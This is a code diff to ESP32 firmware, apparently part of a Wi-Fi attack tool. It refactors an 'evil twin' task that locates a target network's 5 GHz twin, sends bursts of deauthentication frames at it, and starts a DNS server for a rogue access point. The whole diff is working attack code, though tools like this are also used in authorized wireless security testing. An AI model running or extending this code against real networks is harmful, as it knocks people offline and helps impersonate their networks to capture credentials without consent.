@@ -41,7 +41,7 @@ static void evil_twin_task(void *pvParameters)
 
     /* Get target information */
     target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
-    target_info_t twin_on_5ghz = {0};
+    target_info_t *twin_on_5ghz = target_get(TARGET_INFO_EVIL_TWIN_5G);
 
     /*Try guess by ssid */
     target->vendor = getVendor((char *)&target->ssid);
@@ -78,19 +78,18 @@ static void evil_twin_task(void *pvParameters)
             for(uint8_t i = 0; i < aps.count; i++) {
                 /* Found same AP on 5ghz */
                 if( (aps.ap[i].primary > 14) && (strcmp((char *)aps.ap[i].ssid, (char *)target->ssid) == 0) ) {
-                    twin_on_5ghz.attack_scheme = target->attack_scheme;
-                    twin_on_5ghz.authmode = aps.ap[i].authmode;
-                    twin_on_5ghz.channel = aps.ap[i].primary;
-                    twin_on_5ghz.group_cipher = aps.ap[i].group_cipher;
-                    twin_on_5ghz.pairwise_cipher = aps.ap[i].pairwise_cipher;
-                    twin_on_5ghz.rssi = aps.ap[i].rssi;
-                    twin_on_5ghz.vendor = target->vendor;
-                    memcpy(twin_on_5ghz.ssid, aps.ap[i].ssid, sizeof(aps.ap[i].ssid));
-                    memcpy(twin_on_5ghz.bssid, aps.ap[i].bssid, sizeof(aps.ap[i].bssid));
-                    target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
+                    twin_on_5ghz->attack_scheme = target->attack_scheme;
+                    twin_on_5ghz->authmode = aps.ap[i].authmode;
+                    twin_on_5ghz->channel = aps.ap[i].primary;
+                    twin_on_5ghz->group_cipher = aps.ap[i].group_cipher;
+                    twin_on_5ghz->pairwise_cipher = aps.ap[i].pairwise_cipher;
+                    twin_on_5ghz->rssi = aps.ap[i].rssi;
+                    twin_on_5ghz->vendor = target->vendor;
+                    memcpy(twin_on_5ghz->ssid, aps.ap[i].ssid, sizeof(aps.ap[i].ssid));
+                    memcpy(twin_on_5ghz->bssid, aps.ap[i].bssid, sizeof(aps.ap[i].bssid));
                     evil_twin_status.has_5ghz_target = true;
-                    ESP_LOGI(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
-                    ws_log(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
+                    ESP_LOGI(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz->channel);
+                    ws_log(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz->channel);
                     break;
                 }
             }
@@ -122,11 +121,11 @@ static void evil_twin_task(void *pvParameters)
 
         /* Deauth 5Ghz twin */
         if(evil_twin_status.has_5ghz_target == true ) {
-            if(wifi_set_temporary_channel(twin_on_5ghz.channel, ATTACK_WINDOW) == ESP_OK) {
+            if(wifi_set_temporary_channel(twin_on_5ghz->channel, ATTACK_WINDOW) == ESP_OK) {
                 vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
                 /* Send Burst */
                 for(uint8_t burst = 0; burst < 15; burst++) {
-                    frame_send_err = wifi_attack_deauth_client_negative_tx_power(twin_on_5ghz.bssid, twin_on_5ghz.channel, (char *)twin_on_5ghz.ssid);
+                    frame_send_err = wifi_attack_deauth_client_negative_tx_power(twin_on_5ghz->bssid, twin_on_5ghz->channel, (char *)twin_on_5ghz->ssid);
                     if(frame_send_err == ESP_OK) {
                         evil_twin_status.packet_sent_5ghz++;
                         vTaskDelay(pdMS_TO_TICKS(2));
@@ -166,23 +165,21 @@ static void evil_twin_task(void *pvParameters)
                             else {
                                 if (!evil_twin_status.has_5ghz_target) {
                                     evil_twin_status.has_5ghz_target = true;
-                                    twin_on_5ghz.attack_scheme = target->attack_scheme;
-                                    twin_on_5ghz.authmode = aps.ap[i].authmode;
-                                    twin_on_5ghz.channel = aps.ap[i].primary;
-                                    twin_on_5ghz.group_cipher = aps.ap[i].group_cipher;
-                                    twin_on_5ghz.pairwise_cipher = aps.ap[i].pairwise_cipher;
-                                    twin_on_5ghz.rssi = aps.ap[i].rssi;
-                                    twin_on_5ghz.vendor = target->vendor;
-                                    memcpy(twin_on_5ghz.bssid, aps.ap[i].bssid, 6);
-                                    memcpy(twin_on_5ghz.ssid, aps.ap[i].ssid, sizeof(aps.ap[i].ssid));
-                                    target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
+                                    twin_on_5ghz->attack_scheme = target->attack_scheme;
+                                    twin_on_5ghz->authmode = aps.ap[i].authmode;
+                                    twin_on_5ghz->channel = aps.ap[i].primary;
+                                    twin_on_5ghz->group_cipher = aps.ap[i].group_cipher;
+                                    twin_on_5ghz->pairwise_cipher = aps.ap[i].pairwise_cipher;
+                                    twin_on_5ghz->rssi = aps.ap[i].rssi;
+                                    twin_on_5ghz->vendor = target->vendor;
+                                    memcpy(twin_on_5ghz->bssid, aps.ap[i].bssid, 6);
+                                    memcpy(twin_on_5ghz->ssid, aps.ap[i].ssid, sizeof(aps.ap[i].ssid));
                                     ESP_LOGI(TAG, "New 5GHz target found on Ch %d", aps.ap[i].primary);
                                 }
-                                if (twin_on_5ghz.channel != aps.ap[i].primary) {
-                                    ESP_LOGW(TAG, "TARGET 5GHz SWITCHED CHANNEL: %d -> %d", twin_on_5ghz.channel, aps.ap[i].primary);
+                                if (twin_on_5ghz->channel != aps.ap[i].primary) {
+                                    ESP_LOGW(TAG, "TARGET 5GHz SWITCHED CHANNEL: %d -> %d", twin_on_5ghz->channel, aps.ap[i].primary);
                                     ws_log(TAG, "Target 5GHz moved to Ch %d", aps.ap[i].primary);
-                                    twin_on_5ghz.channel = aps.ap[i].primary;
-                                    target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
+                                    twin_on_5ghz->channel = aps.ap[i].primary;
                                 }
                             }
                         }
@@ -202,7 +199,7 @@ static void evil_twin_task(void *pvParameters)
 }
 
 
-void evil_twin_start_attack(const target_info_t *targe_info)
+void evil_twin_start_attack(const target_info_t *target_info)
 {
     if( evil_twin_task_handle != NULL )
     {   
@@ -221,13 +218,13 @@ void evil_twin_start_attack(const target_info_t *targe_info)
     /* Start DNS Server */
     dns_server_start();
     /* Start EvilTwin Task */
-    target_set(targe_info, TARGET_INFO_EVIL_TWIN);
+    target_set(target_info, TARGET_INFO_EVIL_TWIN);
     evil_twin_running = true;
-    task_manager_create_task(evil_twin_task, "evil_twin_task", 4096, NULL, EVIL_TWIN_TASK_PRIO, &evil_twin_task_handle);
+    task_manager_create_task(evil_twin_task, "evil_twin_task", 6144, NULL, EVIL_TWIN_TASK_PRIO, &evil_twin_task_handle);
 
     evil_twin_status.current_status = EVIL_TWIN_ATTACK_STATUS_ACTIVE;
     ESP_LOGI(TAG, "Evil-Twin attack started.");
-    ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target_get(TARGET_INFO_EVIL_TWIN)->ssid, target_get(TARGET_INFO_EVIL_TWIN)->channel);
+    ESP_LOGI(TAG, "TARGET: %s on Channel %d.", (char *)target_info->ssid, target_info->channel);
 }
 
 
